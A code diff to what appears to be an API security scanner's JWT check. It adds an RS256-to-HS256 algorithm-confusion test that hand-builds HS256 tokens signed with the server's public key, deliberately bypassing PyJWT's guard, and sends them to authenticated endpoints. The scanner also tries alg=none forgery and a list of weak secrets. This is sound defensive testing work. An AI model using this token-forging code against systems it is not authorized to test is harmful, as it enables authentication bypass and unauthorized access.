@@ -5,18 +5,37 @@ Requires PyJWT. If a valid sample JWT is supplied in the config
   1. Try to forge a token with alg=none and see if it's accepted.
   2. Try a short list of very common/weak HMAC secrets against the token's
      signature, purely to catch egregiously weak secrets (e.g. "secret").
+  3. If the token uses an asymmetric algorithm (RS256/ES256/...) and a
+     public key is available (jwt_public_key, or fetched from jwks_url),
+     attempt an RS256->HS256 algorithm-confusion attack: sign a forged
+     token with HS256 using the public key bytes as the HMAC secret. Some
+     JWT libraries load "the key" generically and will happily HMAC-verify
+     against it if an attacker can flip 'alg' to HS256.
 This is intentionally limited in scope - it is not a full JWT cracker.
 """
 import base64
+import hashlib
+import hmac
 import json
 from scanner.models import Endpoint, Finding, Severity
 
 try:
     import jwt as pyjwt
+    from jwt.algorithms import RSAAlgorithm
 except ImportError:
     pyjwt = None
+    RSAAlgorithm = None
+
+try:
+    from cryptography.hazmat.primitives import serialization
+except ImportError:
+    serialization = None
+
+import requests
 
 COMMON_WEAK_SECRETS = ["secret", "changeme", "password", "123456", "jwt_secret", "test"]
+
+ASYMMETRIC_ALGS = ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512")
 
 
 def _b64url_decode_segment(seg: str) -> bytes:
@@ -24,7 +43,54 @@ def _b64url_decode_segment(seg: str) -> bytes:
     return base64.urlsafe_b64decode(seg + padding)
 
 
-def run(client, endpoints: list[Endpoint], jwt_sample_token: str = None) -> list[Finding]:
+def _b64url_encode(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+def _manual_hs256_token(header: dict, payload: dict, secret: bytes) -> str:
+    """Manually builds an HS256 JWT, bypassing PyJWT's own prepare_key()
+    guard (modern PyJWT refuses to HMAC-sign with a PEM/asymmetric-looking
+    key, precisely to prevent this attack). We deliberately bypass that
+    guard here because the goal is to test whether the *target server* has
+    the same protection - not to test PyJWT's own key handling."""
+    signing_input = (
+        _b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." +
+        _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+    )
+    signature = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
+    return f"{signing_input}.{_b64url_encode(signature)}"
+
+
+def _fetch_public_key_pem(jwks_url: str, kid: str) -> bytes:
+    """Fetches a JWKS document and converts the matching (or first) RSA key
+    to PEM bytes, for use in the RS256->HS256 algorithm-confusion attack."""
+    if RSAAlgorithm is None or serialization is None:
+        return None
+    try:
+        resp = requests.get(jwks_url, timeout=10)
+        resp.raise_for_status()
+        keys = resp.json().get("keys", [])
+    except Exception:
+        return None
+    if not keys:
+        return None
+
+    key_dict = next((k for k in keys if k.get("kid") == kid), None) if kid else None
+    if key_dict is None:
+        key_dict = keys[0]
+
+    try:
+        public_key = RSAAlgorithm.from_jwk(json.dumps(key_dict))
+        return public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+    except Exception:
+        return None
+
+
+def run(client, endpoints: list[Endpoint], jwt_sample_token: str = None,
+        jwt_public_key: str = None, jwks_url: str = None) -> list[Finding]:
     findings = []
 
     if not jwt_sample_token:
@@ -178,5 +244,72 @@ def run(client, endpoints: list[Endpoint], jwt_sample_token: str = None) -> list
                         curl_repro=getattr(resp, "curl_repro", ""),
                     ))
                 break  # one endpoint is enough to prove/disprove this
+
+    # 5. RS256/ES256 -> HS256 algorithm-confusion attack: if the server's
+    # public key is known (jwt_public_key config, or fetched from jwks_url),
+    # sign a forged token with HS256 using the public key's bytes as the HMAC
+    # secret. Libraries that load "the verification key" generically (without
+    # pinning the expected algorithm) will treat the same public key material
+    # as a valid HMAC secret if an attacker flips 'alg' to HS256.
+    alg = header.get("alg", "").upper()
+    if alg in ASYMMETRIC_ALGS:
+        if pyjwt is None:
+            pass
+        else:
+            public_key_pem = None
+            if jwt_public_key:
+                public_key_pem = jwt_public_key.encode() if isinstance(jwt_public_key, str) else jwt_public_key
+            elif jwks_url:
+                public_key_pem = _fetch_public_key_pem(jwks_url, header.get("kid"))
+
+            if not public_key_pem:
+                findings.append(Finding(
+                    check="jwt", severity=Severity.INFO,
+                    title=f"Token uses asymmetric alg='{alg}' - algorithm-confusion attack not tested",
+                    endpoint="-",
+                    detail=("This token is signed with an asymmetric algorithm. To test for an "
+                            "RS256->HS256 algorithm-confusion vulnerability, provide the "
+                            "server's public key via 'jwt_public_key' (PEM string) or 'jwks_url' "
+                            "in config.yaml."),
+                ))
+            else:
+                confused_header = dict(header)
+                confused_header["alg"] = "HS256"
+                try:
+                    secret_bytes = public_key_pem if isinstance(public_key_pem, bytes) else public_key_pem.encode()
+                    confused_token = _manual_hs256_token(confused_header, payload, secret_bytes)
+                except Exception:
+                    confused_token = None
+
+                if confused_token:
+                    for ep in endpoints:
+                        if not ep.auth_required:
+                            continue
+                        path = ep.resolved_path()
+                        label = f"{ep.method} {path}"
+                        try:
+                            resp = client.request(ep.method, path,
+                                                   headers={"Authorization": f"Bearer {confused_token}"},
+                                                   params=ep.params if ep.method == "GET" else None,
+                                                   json_body=ep.body, auth_override="keep")
+                        except Exception:
+                            continue
+                        if resp.status_code < 300:
+                            findings.append(Finding(
+                                check="jwt", severity=Severity.CRITICAL,
+                                title=f"JWT algorithm-confusion attack accepted ({alg} -> HS256)",
+                                endpoint=label,
+                                detail=(f"A token originally signed with '{alg}' was re-forged "
+                                        "with alg='HS256', signed using the server's own public "
+                                        "key as the HMAC secret, and accepted. This means "
+                                        "verification doesn't pin the expected algorithm/key type "
+                                        "per token - a classic and critical JWT vulnerability that "
+                                        "lets anyone who knows the public key (often public by "
+                                        "design) forge arbitrary valid tokens."),
+                                evidence=f"HTTP {resp.status_code}",
+                                owasp_ref="API2:2023 Broken Authentication",
+                                curl_repro=getattr(resp, "curl_repro", ""),
+                            ))
+                        break  # one endpoint is enough to prove/disprove this
 
     return findings
